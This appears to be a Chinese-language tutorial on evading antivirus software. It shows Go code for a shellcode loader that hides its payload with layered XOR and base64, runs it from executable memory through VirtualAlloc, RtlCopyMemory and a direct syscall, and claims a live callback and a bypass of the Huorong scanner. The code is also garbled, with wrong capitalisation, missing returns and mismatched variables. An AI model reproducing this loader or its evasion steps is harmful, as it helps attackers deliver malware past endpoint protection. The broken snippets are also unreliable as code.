免杀思路



整体思路就是简单地通过xor和base64多层加密，利用go语言实现加载器

操作



1、首先当然是读取到我们生成的源代码



Func getshellcode(file string) []byte{    Data, err := ioutil.ReadFile(file)    If err!= nil{        fmt.Print(err)    }}


2、然后定义加解密操作,逐位异或,xor_key为自己定义的异或字符16进制编码，然后进行base64编码。解密就是反过来操作一下。



Func encode(code string) []byte{    Shellcode := []byte(code)    Var xor_code []byte    For I := 0;I < len(shellcode);i++{        Xor_code = append(xor_code, shellcode[i]^xor_key[0]^xor_key[1])    }    b64_code := base64.StdEncoding.EncodeToString(xor_code)    Return b64_code}Func decode(code string) []byte{    B64_decode := base64.StdEncoding.DecodeString(code)    Xor_code := []byte(B64_decode)    Var xor_decode []byte    For j:=0; j < len(xor_code);j++ {        Xor_decode = append(shellcode, xor_code[j]^xor_key[1]^xor_key[0])    }    Return xor_decode}


3、加解密部分完成了，接下来就是如何能让它执行的问题了，这时候就需要写一个加载器功能出来。




在golang下，我们可以通过syscal来调用win32的api，syscall.MustLoadDLL调用kernel32.dll和ntdll.dll。kernel32它控制着系统的内存管理、数据的输入输出操作和中断处理，windows启动时，kernel32.dll就驻留在内存中特定的写保护区域；


 


ntdll.dll承担了windows内核提供的所有原生API，例如我们读文件调用kernel32中的ReadFile()函数，这个函数又调用了ntdll中的NtReadFile()函数，我们通过ntdll可以让我们的代码运行到内核当中。


 


接着我们就需要调用VirtualAlloc函数，它包含在kernel32.dll中，它的功能是在调用进程的虚地址空间，简单来说就是申请一块内存空间。这里多解释一点VirtualAlloc.call函数具体使用的一些参数含义:

MEM_COMMIT：根据内存的总大小和磁盘上的分页文件为指定的预留内存页分配内存

MEM_RESERVE：保留进程的虚拟地址空间范围，不在内存或磁盘上的页面文件中分配任何实际物理存储。


 


还需要用到的一个函数是RtlMoveMemory，它包含在ntdll.dll中，它的功能是从指定内存中复制内存到另一个内存中，这里有个不同在RtlCopyMemory和RtlMoveMemory,前者是非重叠复制，后者为重叠复制。

这是一段最基本的go加载代码，网上各位师傅的一大堆，可直接搬。也可以自己写个，这里主要写调用虚拟地址空间、复制内存和调用执行的。


Func load_exe(code []byte) {    Addr, _, err :=VirtualAlloc.Call(0, uintptr(len(code)), MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)    _, _, err = RtlCopyMemory.Call(addr,(uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))    For k:= 0;k < len(code); k++{        Code[k] = 0    }    Syscall.Syscall(addr, 0, 0, 0, 0)}


基本的功能点就这样了，主要还是b64编码和多重异或，然后gobuild .运行后上线成功,打开火绒扫描，成功绕过，网上的绕过方法也有很多，大家可以继续发散思维。
